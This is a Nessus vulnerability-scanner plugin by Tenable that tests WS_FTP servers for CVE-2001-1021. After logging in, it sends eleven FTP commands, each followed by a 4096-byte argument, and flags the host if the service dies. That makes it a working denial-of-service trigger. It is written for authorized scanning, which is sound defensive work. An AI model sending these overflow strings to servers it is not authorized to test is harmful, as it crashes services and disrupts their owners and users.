#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if(description)
{
 script_id(11094);
 script_version ("$Revision: 1.21 $");
 script_cve_id("CVE-2001-1021");
 script_osvdb_id(14115);

 script_name(english:"WS_FTP Multiple Command Long Argument Overflow");
 
 script_set_attribute(attribute:"synopsis", value:
"It is possible to crash the remote FTP server." );
 script_set_attribute(attribute:"description", value:
"It is possible to shut down the remote FTP server by issuing
a command followed by a too long argument.

An attacker may use this flow to prevent your site from 
sharing some resources with the rest of the world, or even
execute arbitrary code on your system." );
 script_set_attribute(attribute:"solution", value:
"Upgrade to the latest version your FTP server." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");


 script_set_attribute(attribute:"plugin_publication_date", value: "2002/08/21");
 script_set_attribute(attribute:"vuln_publication_date", value: "2001/07/26");
 script_cvs_date("$Date: 2015/12/23 21:38:31 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();

 
 summary["english"] = "Attempts a buffer overflow on many commands";
 script_summary(english:summary["english"]);
 
 script_category(ACT_DENIAL);
 
 script_copyright(english:"This script is Copyright (C) 2002-2015 Tenable Network Security, Inc.");
 script_family(english:"FTP");
 script_dependencie("ftp_anonymous.nasl", "ftpserver_detect_type_nd_version.nasl");
 script_require_ports("Services/ftp", 21);
 exit(0);
}

#

include("audit.inc");
include("global_settings.inc");
include ("misc_func.inc");
include ("ftp_func.inc");


port = get_ftp_port(default: 21);

login = get_kb_item("ftp/login");
password = get_kb_item("ftp/password");

if (supplied_logins_only && (isnull(login) || isnull(password)))
  audit(AUDIT_SUPPLIED_LOGINS_ONLY);

if(!login) login = "ftp";
if (! password) password = "test@nessus.org";

soc = open_sock_tcp(port);
if(! soc) exit(1);
if(! ftp_authenticate(socket:soc, user:login, pass:password))
{
  ftp_close(socket: soc);
  exit(0);
}

cmd[0] = "DELE";
cmd[1] = "MDTM";
cmd[2] = "MLST";
cmd[3] = "MKD";
cmd[4] = "RMD";
cmd[5] = "RNFR";
cmd[6] = "RNTO";
cmd[7] = "SIZE";
cmd[8] = "STAT";
cmd[9] = "XMKD";
cmd[10] = "XRMD ";

pb=0;
for (i=0; i<11; i=i+1)
{
  s = strcat(cmd[i], " /", crap(4096), '\r\n');
  send(socket:soc, data:s);
  r = recv_line(socket:soc, length:1024);
  #if(!r) pb=pb+1;
  ftp_close(socket: soc);
 
  soc = open_sock_tcp(port);
  if (! soc)
  {
   if (service_is_dead(port: port) <= 0)
     exit(1, "Could not reconnect to port "+port+".");
   security_hole(port);
   exit(0);
  }
  ftp_authenticate(socket:soc, user:login, pass:password);
}

ftp_close(socket: soc);

